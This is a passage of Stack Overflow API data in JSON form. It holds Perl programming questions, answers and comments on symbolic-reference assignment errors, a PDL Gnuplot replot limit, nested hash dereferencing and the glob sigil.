"https://www.gravatar.com/avatar/7869e47ef194829636a91d5832b3d36b?s=128&d=identicon&r=PG&f=1", "display_name": "user62177541", "link": "https://stackoverflow.com/users/3938923/user62177541"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 83, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1457616616, "creation_date": 1457071491, "last_edit_date": 1457616616, "question_id": 35789074, "link": "https://stackoverflow.com/questions/35789074/error-cannot-copy-to-array-in-scalar-assignment", "title": "Error: &quot;Cannot copy to ARRAY in scalar assignment&quot;", "body": "<p>The situation is that I am in a <code>sub</code> trying to use the caller's <code>$a</code> and <code>$b</code>, similar to what <code>sort</code> does. Most of the time it works, but while running unit tests I noticed in one case, inside one package, it did not work. I use <code>caller</code> to get the package of the caller and then set their <code>$a</code> and <code>$b</code> as shown in the following simplified demo. The problem <em>does</em> occur by simply calling this <code>whatever</code> function in the package where I discovered this.</p>\n\n<pre><code>sub whatever {         # defined in main package\n  my $pkg = caller;\n  no strict 'refs';\n  ${\"${pkg}::a\"} = \"\";\n  ${\"${pkg}::b\"} = \"\";\n}\n</code></pre>\n\n<p>I attempted to create a minimal package/class to reproduce the problem but the problem does not occur in this context, but I'm posting my attempt below anyway as an indication of the general context:</p>\n\n<pre><code>package WhateverClass {\n    sub new {\n        my ($class, $something, $something2) = @_;\n        my $this = {};\n        bless $this, $class;\n        $this-&gt;{something_} = $something;\n        $this-&gt;{something2_} = $something2;\n        return $this;\n    }\n    sub test { # bug reproduction\n        main::whatever();\n    }\n}\n\nmy $obj = WhateverClass-&gt;new(1.0, 2.0);\n$obj-&gt;test;\n</code></pre>\n\n<p>The error message is, </p>\n\n<pre><code>Error: \"Cannot copy to ARRAY in scalar assignment\"\n</code></pre>\n\n<p>And it is triggered by the exact line:</p>\n\n<pre><code>${\"${pkg}::a\"} = \"\";\n</code></pre>\n\n<p>Having narrowed it down to this \"whatever\" function, I tried putting a variety of things on the right side of that assignment, including arrayrefs, arrays, strings as shown, numbers, as well as undef. The ones that it accepts are only undef, integer values, and floating point values. It does not accept arrayrefs, hashrefs, or strings. In my case, in the original code that exposed this problem, the things being passed were object references, or blessed hashrefs, and those assignments fail as you'd expect if any hashref or arrayref assignment fails.</p>\n\n<p>Even more strangely, under the Perl debugger the problem doesn't occur, but if I run normally it does. </p>\n\n<p>Google searching for this turns up nothing matching this exact error and very little that is even close. So first question is what does this error message even mean? Second question is obviously how to move forward. </p>\n\n<p>I'm using Perl 5.20.3 on Linux, but I also tried the latest 5.22 on a Windows machine and saw the same behavior.</p>\n"}, {"tags": ["perl", "gnuplot", "pdl"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 3, "creation_date": 1457124131, "post_id": 35782290, "comment_id": 59280754, "body": "This sounds like a bug. You should report it to the PDL::Graphics::Gnuplot maintainers <a href=\"https://rt.cpan.org/Public/Dist/Display.html?Name=PDL-Graphics-Gnuplot\" rel=\"nofollow noreferrer\">here</a>."}], "owner": {"reputation": 2304, "user_id": 1306503, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/70b51811841e652627e6bae333d72d97?s=128&d=identicon&r=PG", "display_name": "Nemesis", "link": "https://stackoverflow.com/users/1306503/nemesis"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 157, "favorite_count": 1, "answer_count": 0, "score": 8, "last_activity_date": 1457036681, "creation_date": 1457036681, "question_id": 35782290, "link": "https://stackoverflow.com/questions/35782290/point-limitation-for-pdl-gnuplot-and-qt-terminal-using-replot", "title": "Point limitation for PDL Gnuplot and QT terminal using replot", "body": "<p>While using PDL::Graphics::Gnuplot to plot data, I came across a strange effect. It seems, only a limited number of points is plotted at a time using <code>replot</code>.</p>\n\n<p>Consider the following example (15 lines with 101 points):</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse PDL;\nuse PDL::Graphics::Gnuplot qw/gpwin/;\n\nmy $win = gpwin('qt', persist =&gt; 1);\n\nforeach my $a (1..15) {\n    my $x = sequence(101)/100;\n\n    my $y = $a*$x;\n\n    if ($a == 1) {\n        $win-&gt;plot({ linecolor =&gt; 'black' }, $x, $y);\n    }\n    else {\n        $win-&gt;replot({ linecolor =&gt; 'black' }, $x, $y);\n    }\n}\n</code></pre>\n\n<p>Using this example, only 11 lines are plotted instead of 15.<a href=\"https://i.stack.imgur.com/Q4xew.png\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/Q4xew.png\" alt=\"using 101 points\"></a></p>\n\n<p>Reducing the number of points (from 101 to 51), 14 lines are plotted.\n<a href=\"https://i.stack.imgur.com/TRLH3.png\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/TRLH3.png\" alt=\"using 51 points\"></a></p>\n\n<p>And finally using only 21 points, all 15 lines are displayed.</p>\n\n<p><a href=\"https://i.stack.imgur.com/WGFhO.png\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/WGFhO.png\" alt=\"using 21 points\"></a></p>\n\n<p>First, I thought only a limited number of lines is plotted, but this is not true since the number of plotted lines depend on the size of the piddles.</p>\n\n<p>Is this a limit of the perl module or of Gnuplot? Is there a way to increase the number of maximum points? It seems to be a problem of Gnuplots qt version. Using <code>'x11'</code> as terminal does not show this limitation (I tested 100 lines with 101 points without any problems).</p>\n\n<p>Further, I test the same example without using <code>replot</code> but in a single <code>plot</code>.</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse PDL;\nuse PDL::Graphics::Gnuplot qw/gpwin/;\n\nmy $win = gpwin('qt', persist =&gt; 1);\n\nmy $x = sequence(101)/100;\nmy $a = sequence(1,15)+1;\nmy $y = $x*$a;\n\n$win-&gt;plot({ linecolor =&gt; 'black' }, $x, $y);\n</code></pre>\n\n<p>Using this code, everything works fine (even when increasing the number of lines to significantly larger values).</p>\n\n<p><a href=\"https://i.stack.imgur.com/8sVNX.png\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/8sVNX.png\" alt=\"101 points in a single plot\"></a></p>\n\n<p>So finally, it seems to be an issue of the <code>replot</code> functionality of the <code>'qt'</code> terminal.</p>\n\n<p>(G N U P L O T        Version 4.6 patchlevel 6)</p>\n"}, {"tags": ["perl", "hash", "arguments", "subroutine", "hash-of-hashes"], "comments": [{"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1457037421, "post_id": 35782122, "comment_id": 59236319, "body": "Short answer: Yes. But you will get more detailed answers if you&#39;d show us a short example (perl code) of how your structure looks like."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1457039146, "post_id": 35782122, "comment_id": 59237376, "body": "You should post the code you&#39;re having a problem with. See <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a> for more information."}], "answers": [{"tags": [], "owner": {"reputation": 15304, "user_id": 4632019, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/8937eb40752cf51c7da61bd4a322a4ef?s=128&d=identicon&r=PG&f=1", "display_name": "Eugen Konkov", "link": "https://stackoverflow.com/users/4632019/eugen-konkov"}, "is_accepted": true, "score": 1, "last_activity_date": 1457184900, "last_edit_date": 1457184900, "creation_date": 1457042236, "answer_id": 35783846, "question_id": 35782122, "link": "https://stackoverflow.com/questions/35782122/creating-a-subroutine-in-perl-that-will-take-a-hash-from-a-hash-of-hashes-as-an/35783846#35783846", "title": "creating a subroutine in Perl that will take a hash from a hash of hashes as an argument and print out one of the values from that hash", "body": "<p>Some examples to understand structures. These all mean same (with small difference):</p>\n\n<pre><code># just a hash\n%hash = ( 'a', 1, 'b', '2' );\n%hash = ( a =&gt; 1, b =&gt; '2' );\n# ref to hash\n$hash_ref = \\%hash;\n$hash_ref = { a =&gt; 1, b =&gt; 2 };\n\nprint $hash{ a }; #prints 1\nprint $hash_ref-&gt;{ a }; #prints 1\n</code></pre>\n\n<p>1 and '2' are values. Values maybe only scalars. Reference to SOMETHING is also scalar. $hash_ref in the example above.</p>\n\n<p>In your example you say 1st hash is list. I think you mean array:</p>\n\n<pre><code>$list = [ $error1, $error2 ];\n\n$error1 = { error_name =&gt; $description }\n\n$description = { status =&gt; 'status', message =&gt; 'msg', params =&gt; [ 1,2,'asdf'] }\n</code></pre>\n\n<p>You know that a sub get list of scalars. If you want to pass hash into sub you just pass reference to this hash</p>\n\n<pre><code>fn( \\%hash );\n</code></pre>\n\n<p>and get this hash at sub:</p>\n\n<pre><code>sub fn { \n    my( $hash ) =  @_;\n    print $hash-&gt;{ key_name };\n}\n</code></pre>\n\n<p>I suppose you have just a list of errors, each of them contain keys:</p>\n\n<pre><code>$list_of_errors = [\n    { status =&gt; 1, message =&gt; 'hello' },\n    { status =&gt; 2, message =&gt; 'hello2' },\n    { status =&gt; 1, message =&gt; 'hello3' },\n] \n\nfn( $list_of_errors );\n\nsub fn {\n   my( $le ) =  @_;\n\n   print $le-&gt;[1]{ message }; #will print 'hello2'\n   # print $le-&gt;{ error_name }{ status }; #try this in case hash of hashes\n}\n</code></pre>\n\n<p>To understand structures better try to use Data::Dump module;</p>\n\n<pre><code>use Data::Dump qw/ pp /;\n%hash = ( a =&gt; 1 );\n$hash = \\%hash;\n$arr =  [ 1, 2, 'a' ];\nprint pp $hash, \\%hash, $arr;\n</code></pre>\n\n<p>Good luck.</p>\n\n<p><strong>CODE</strong></p>\n\n<pre><code>our %error = (\n    ERROR_1 =&gt; {\n         statusCode =&gt; 561,\n         message =&gt; \"an unexpected error occurred at location X\",\n         params =&gt; $param_1,\n    },\n    ERROR_2 =&gt; {\n         statusCode =&gt; 561,\n         message =&gt; \"an unexpected error occurred at location Y\",\n         params =&gt; $param_1,\n   }\n);\n\nsub print_err {\n    my( $err_name ) =  @_;\n\n    print $error{ $err_name }{ message } .\"\\n\";\n}\n\nprint_err( 'ERROR_1' );\nprint_err( 'ERROR_2' );\n</code></pre>\n"}], "owner": {"reputation": 169, "user_id": 6000354, "user_type": "registered", "accept_rate": 81, "profile_image": "https://graph.facebook.com/1122424037792331/picture?type=large", "display_name": "Paul Russell", "link": "https://stackoverflow.com/users/6000354/paul-russell"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 63, "favorite_count": 0, "accepted_answer_id": 35783846, "answer_count": 1, "score": 0, "last_activity_date": 1457193044, "creation_date": 1457036081, "last_edit_date": 1457193044, "question_id": 35782122, "link": "https://stackoverflow.com/questions/35782122/creating-a-subroutine-in-perl-that-will-take-a-hash-from-a-hash-of-hashes-as-an", "title": "creating a subroutine in Perl that will take a hash from a hash of hashes as an argument and print out one of the values from that hash", "body": "<p>More details:</p>\n\n<p>1st hash: hash of error messages<br>\n2nd hash: error message itself (error_name)</p>\n\n<p>which contains 3 key values (statusCode, message, params)</p>\n\n<p>I am trying to create a method that will take in error_name and print out the message. \nThis is the code I have at the minute:</p>\n\n<pre><code>`our %error = (\n               ERROR_1 =&gt; {\n                                     statusCode =&gt; 561.\n                                     message =&gt; \"an unexpected error occurred at location X\",\n                                     params =&gt; $param_1,\n                          }\n               ERROR_2 =&gt; {\n                                     statusCode =&gt; 561.\n                                     message =&gt; \"an unexpected error occurred at location Y\",\n                                     params =&gt; $param_1,\n                          }\n);\n`\n</code></pre>\n\n<p>Is this possible?\nI'm trying to create a subroutine that will take an error  from the hash %error and print out its message. Is this possible? \nOr maybe there is a better way of doing it. </p>\n"}, {"tags": ["perl", "hash", "hashmap"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1457033694, "post_id": 35781181, "comment_id": 59234128, "body": "<code>$hashref2{$machineresult}</code> is a reference to an array, so <code>keys %{ $hashref2{$machineresult} }</code> makes no sense. You want <code>@{ $hashref2{$machineresult} }</code>"}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1457034313, "post_id": 35781181, "comment_id": 59234479, "body": "It <i>seems</i> to me that your <code>%ani_hash</code> always has 2 elements, <code>machine_results</code> and <code>description</code>, and you merely want to iterate over the array(ref) in <code>machine_results</code>, right?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 13399, "user_id": 716443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8d13509991dbbd5467f01f55988ae4e?s=128&d=identicon&r=PG", "display_name": "DavidO", "link": "https://stackoverflow.com/users/716443/davido"}, "edited": false, "score": 0, "creation_date": 1457036116, "post_id": 35781181, "comment_id": 59235530, "body": "@DavidO: I have a problem with your sarcasm, as well as the implication that <i>recursion</i> is the only way to process such a structure"}, {"owner": {"reputation": 65, "user_id": 5544515, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f5022cabff3e71101f51b69ddcf800aa?s=128&d=identicon&r=PG&f=1", "display_name": "hitman99", "link": "https://stackoverflow.com/users/5544515/hitman99"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1457045423, "post_id": 35781181, "comment_id": 59240656, "body": "Thank you @ikegami for your help, I have edited my post. Let me know if this looks good."}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1457093337, "post_id": 35781181, "comment_id": 59260922, "body": "Just run the code yourself and you&#39;ll see <code>Can&#39;t use string (&quot;MC-5897&quot;) as an ARRAY ref while &quot;strict refs&quot; in use at .&#47;so.pl line 36.</code> That&#39;s the line <code>foreach my $array</code>. It happens because the code tries to interpret <code>$hashref2{&#39;description&#39;}</code> as an arrayref which it isn&#39;t. It&#39;s a string."}], "answers": [{"comments": [{"owner": {"reputation": 65, "user_id": 5544515, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f5022cabff3e71101f51b69ddcf800aa?s=128&d=identicon&r=PG&f=1", "display_name": "hitman99", "link": "https://stackoverflow.com/users/5544515/hitman99"}, "edited": false, "score": 0, "creation_date": 1457045540, "post_id": 35781942, "comment_id": 59240701, "body": "Thank you @Perl Dog for your help. I modified the code and edited the post. Let me know if it looks good."}], "tags": [], "owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "is_accepted": false, "score": 1, "last_activity_date": 1457039173, "last_edit_date": 1457039173, "creation_date": 1457035498, "answer_id": 35781942, "question_id": 35781181, "link": "https://stackoverflow.com/questions/35781181/dereferencing-a-nested-hash-in-perl/35781942#35781942", "title": "dereferencing a nested hash in perl", "body": "<p>I assume that your <code>%ani_hash</code> always has 2 elements, <code>machine_results</code> and <code>description</code>, and you merely want to iterate over the array(ref) in <code>machine_results</code>. If that is true, the following can help:</p>\n\n<pre><code>sub get_elements\n{\n    my $hashref = shift;\n\n    print \"Description: $hashref-&gt;{description}\\n\";\n\n    my $count=0;\n    foreach my $result ( @{ $hashref-&gt;{machine_results} } ) {\n        print $count++, ': ';\n        foreach my $key ( sort keys %{$result} ) {\n            print \"$key=$result-&gt;{$key}, \";\n        }\n        print \"\\n\";\n    }\n}\n\nget_elements( \\%ani_hash );\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>Description: MC-5897\n0: machine=23.73.134.235, seconds=20, status=Failed install, try=1, \n1: machine=23.73.134.140, seconds=20, status=Failed install, try=1, \n</code></pre>\n\n<p>Explanation:</p>\n\n<ul>\n<li><code>$hashref-&gt;{machine_results}</code> is the arrayref with your machine results.</li>\n<li><code>@{ $hashref-&gt;{machine_results} }</code> dereferences it to an array you can iterate over, so</li>\n<li><code>$result</code> is one of these array items which in turn is a reference to a hash</li>\n<li>with <code>%{$result}</code> it gets dereferenced to a hash and we iterate over the (sorted) keys   </li>\n</ul>\n\n<p>This, of course, assumes that your data structure is at it is, i.e. machine_results holds an arrayref with hashrefs inside.</p>\n"}, {"comments": [{"owner": {"reputation": 65, "user_id": 5544515, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f5022cabff3e71101f51b69ddcf800aa?s=128&d=identicon&r=PG&f=1", "display_name": "hitman99", "link": "https://stackoverflow.com/users/5544515/hitman99"}, "edited": false, "score": 0, "creation_date": 1457045616, "post_id": 35781963, "comment_id": 59240729, "body": "Thank you @zdim for the references and the code :). Will certainly look it up."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 65, "user_id": 5544515, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f5022cabff3e71101f51b69ddcf800aa?s=128&d=identicon&r=PG&f=1", "display_name": "hitman99", "link": "https://stackoverflow.com/users/5544515/hitman99"}, "edited": false, "score": 0, "creation_date": 1457045731, "post_id": 35781963, "comment_id": 59240783, "body": "@hitman99  Most welcome.  Good references for this stuff are precious, before you get to read thoroughly from comprehensive resources.  Luckily, SO has a lot of good, hands-on, to-the-point introductions.  Finishing my edit so that this prints your whole structure nicely.  I hope this was useful for you."}, {"owner": {"reputation": 65, "user_id": 5544515, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f5022cabff3e71101f51b69ddcf800aa?s=128&d=identicon&r=PG&f=1", "display_name": "hitman99", "link": "https://stackoverflow.com/users/5544515/hitman99"}, "edited": false, "score": 0, "creation_date": 1457046666, "post_id": 35781963, "comment_id": 59241167, "body": "This was certainly helpful. I agree on your point about SO. Thank you :)"}, {"owner": {"reputation": 65, "user_id": 5544515, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f5022cabff3e71101f51b69ddcf800aa?s=128&d=identicon&r=PG&f=1", "display_name": "hitman99", "link": "https://stackoverflow.com/users/5544515/hitman99"}, "edited": false, "score": 0, "creation_date": 1457046695, "post_id": 35781963, "comment_id": 59241185, "body": "I cannot tag you @zdim somehow I don&#39;t know why :\\"}, {"owner": {"reputation": 65, "user_id": 5544515, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f5022cabff3e71101f51b69ddcf800aa?s=128&d=identicon&r=PG&f=1", "display_name": "hitman99", "link": "https://stackoverflow.com/users/5544515/hitman99"}, "edited": false, "score": 0, "creation_date": 1457110111, "post_id": 35781963, "comment_id": 59272571, "body": "I already upvoted your answer, but it seems that I need some more badges to do so(given I am new here). :)"}, {"owner": {"reputation": 65, "user_id": 5544515, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f5022cabff3e71101f51b69ddcf800aa?s=128&d=identicon&r=PG&f=1", "display_name": "hitman99", "link": "https://stackoverflow.com/users/5544515/hitman99"}, "edited": false, "score": 0, "creation_date": 1458852570, "post_id": 35781963, "comment_id": 60052868, "body": "I did that. Thank you for bringing that to my attention"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 65, "user_id": 5544515, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f5022cabff3e71101f51b69ddcf800aa?s=128&d=identicon&r=PG&f=1", "display_name": "hitman99", "link": "https://stackoverflow.com/users/5544515/hitman99"}, "edited": false, "score": 0, "creation_date": 1458852788, "post_id": 35781963, "comment_id": 60052977, "body": "@hitman99  Thanks for that and for the feedback.  If any questions about this pop up please let me know."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 0, "last_activity_date": 1506022066, "last_edit_date": 1506022066, "creation_date": 1457035563, "answer_id": 35781963, "question_id": 35781181, "link": "https://stackoverflow.com/questions/35781181/dereferencing-a-nested-hash-in-perl/35781963#35781963", "title": "dereferencing a nested hash in perl", "body": "<p>Your code is not unpacking the nested hash correctly.  For a hash <code>%h = ('key' =&gt;  [1, 2])</code> the value associated with <code>key</code> is a reference to an (anonymous) array, so a scalar. See links at the end. </p>\n\n<p>To get to the content of the array we need to de-reference it. Then those array elements are hashrefs themselves and they need to be de-referenced as well</p>\n\n<pre><code>sub get_elements \n{    \n    my %hash = %{ $_[0] };\n    print \"description: $hash{'description'}\\n\";\n    foreach my $mach_res (keys %hash)\n    {   \n        next if $mach_res eq 'description';\n        foreach my $elem ( @{$hash{$mach_res}} ) { \n            my %mach_detail = %$elem;\n            print \"\\t---\\n\";\n            foreach my $key (sort keys %mach_detail) {\n                print \"\\t$key =&gt; $mach_detail{$key}\\n\";\n            }   \n        }           \n    }   \n}\n</code></pre>\n\n<p>The hashref is used to get a new 'in-sub' copy <code>%hash</code>. This is some protection from errors, since the original data cannot be changed. But if you want subs to directly change data whose reference they get then you need to work with the reference itself.  This prints</p>\n\n<pre>\ndescription: MC-5897\n        ---\n        machine => 23.73.134.235\n        seconds => 20\n        status => Failed install\n        try => 1\n        ---\n        machine => 23.73.134.140\n        seconds => 20\n        status => Failed install\n        try => 1\n</pre>\n\n<p>Code will process any additional keys other than 'description'. If you'd like to align the printout, you can first pull the maximum length of a key (word) in it, then use <code>printf</code> for details.</p>\n\n<pre><code>use List::Util qw(max);\nforeach my $elem ( @{$hash{$mach_res}} ) {\n    my %mach_detail = %$elem;\n    my $max_len = max( map { length } keys %mach_detail );\n    print \"\\t---\\n\";\n    foreach my $key (sort keys %mach_detail) {\n        #print \"\\t$key =&gt; $mach_detail{$key}\\n\";\n        printf(\"\\t%${max_len}s =&gt; %s\\n\", $key, $mach_detail{$key});\n    }\n}\n</code></pre>\n\n<p>Module <a href=\"http://perldoc.perl.org/List/Util.html\" rel=\"nofollow noreferrer\">List::Util</a> is used to get <code>max</code> function. Now you get</p>\n\n<pre>\nDescription: MC-5897\n        ---\n        machine => 23.73.134.235\n        seconds => 20\n         status => Failed install\n            try => 1\n        ---\n        machine => 23.73.134.140\n        seconds => 20\n         status => Failed install\n            try => 1\n</pre>\n\n<hr>\n\n<p>A couple of related recent SO resources: a <a href=\"https://stackoverflow.com/questions/35709891/obtaining-a-value-from-a-nested-hash-array-data-structure\">nested hash/array</a> and an <a href=\"https://stackoverflow.com/questions/35734341/iterating-through-an-array-of-hashes#35734341\">array of hashes</a>.</p>\n"}], "owner": {"reputation": 65, "user_id": 5544515, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f5022cabff3e71101f51b69ddcf800aa?s=128&d=identicon&r=PG&f=1", "display_name": "hitman99", "link": "https://stackoverflow.com/users/5544515/hitman99"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 537, "favorite_count": 0, "accepted_answer_id": 35781963, "answer_count": 2, "score": 1, "last_activity_date": 1506022285, "creation_date": 1457033011, "last_edit_date": 1506022285, "question_id": 35781181, "link": "https://stackoverflow.com/questions/35781181/dereferencing-a-nested-hash-in-perl", "title": "dereferencing a nested hash in perl", "body": "<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nmy %ani_hash = (\n    'machine_results' =&gt; [\n        {\n            'status'  =&gt; 'Failed install',\n            'machine' =&gt; '23.73.134.235',\n            'seconds' =&gt; '20',\n            'try'     =&gt; '1'\n        },\n        {\n            'status'  =&gt; 'Failed install',\n            'machine' =&gt; '23.73.134.140',\n            'seconds' =&gt; '20',\n            'try'     =&gt; '1'\n        }\n    ],\n    'description' =&gt; 'MC-5897'\n);\n\nget_elements( \\%ani_hash );\n\nsub get_elements\n{\n    my $hashref1 = shift;\n\n    my %hashref2 = %$hashref1;\n    print \"%hashref1\\n\";\n\n    foreach my $machineresult ( keys %hashref2 ) {\n        foreach my $machineresult2 ( keys %{ $hashref2{$machineresult} } ) {\n            print \"$hashref2{$machineresult}{$machineresult2}\\n\";\n        }\n    }\n}\n\nOutput: \n\n    HASH(0x1e9fe58)\n    Not a HASH reference at ./hashref.pl line 62.\n    Can't use string (\"MC-5897\") as a HASH ref while \"strict refs\" in use at ./hashref.pl line 62.\n</code></pre>\n\n<p>I want to loop through all the key value pairs and get their values.\nI don't want to use the dumper method to get the values, I want to get these by looping method. Any help would be appreciated. Thanks </p>\n\n<p>I did this to fix the issue and get the contents of 'machine_results'.</p>\n\n<pre><code>print \"description: $hashref2{description}\\n\";\n\nforeach my $machineresult( sort keys%hashref2){\n    foreach my $array (@{ $hashref2{$machineresult} }){\n        foreach my $array1( sort keys%{$array} ){\n            print \"key is $array1 and it's value is $array-&gt;{$array1}`\",\n                  \"enter code here`\\n\";    \n        }\n        print \"\\n\";\n    }\n}\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1457033334, "post_id": 35780426, "comment_id": 59233876, "body": "Are you sure it&#39;s not <code>&amp;DoEvent(\\$abc, &quot;DoXyz&quot;, @args)</code> and <code>&amp;DoEvent(\\@xyz, &quot;DoXyz&quot;, @args)</code>? What you posted doesn&#39;t make much sense."}], "answers": [{"tags": [], "owner": {"reputation": 19681, "user_id": 936986, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/075f0ea7418371ace9bba5b901409ab1?s=128&d=identicon&r=PG", "display_name": "Oleg V. Volkov", "link": "https://stackoverflow.com/users/936986/oleg-v-volkov"}, "is_accepted": false, "score": 3, "last_activity_date": 1457031153, "creation_date": 1457031153, "answer_id": 35780561, "question_id": 35780426, "link": "https://stackoverflow.com/questions/35780426/what-does-the-perl-asterisk-sigil-do/35780561#35780561", "title": "What does the Perl asterisk sigil do", "body": "<p>It is namespace symbol sigil that contains all other types. In older Perl code it is usually used to work with file handles. Modern Perl should use simple scalars - i.e. <code>$</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": false, "score": 2, "last_activity_date": 1457156916, "last_edit_date": 1495535345, "creation_date": 1457031491, "answer_id": 35780677, "question_id": 35780426, "link": "https://stackoverflow.com/questions/35780426/what-does-the-perl-asterisk-sigil-do/35780677#35780677", "title": "What does the Perl asterisk sigil do", "body": "<p>It is a <code>glob</code>, which directly accesses symbol table. This way you can access a variable without referring to type (or, any type with that name), for example.  There is rarely a reason that you'd have to use it in Perl nowadays.</p>\n\n<p>Here are some references <a href=\"http://www.perl.com/pub/2005/03/17/symtables.html\" rel=\"nofollow noreferrer\">on symbol table</a>, <a href=\"https://stackoverflow.com/questions/747521/how-can-i-list-all-variables-that-are-in-a-given-scope\">an interesting use of it</a>, and a bit of an <a href=\"http://www.perlmonks.org/?node_id=211441\" rel=\"nofollow noreferrer\">overview</a>.  Books \"Programming Perl\" and \"Mastering Perl\" have an authorative coverage.</p>\n"}, {"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1457033075, "post_id": 35780812, "comment_id": 59233710, 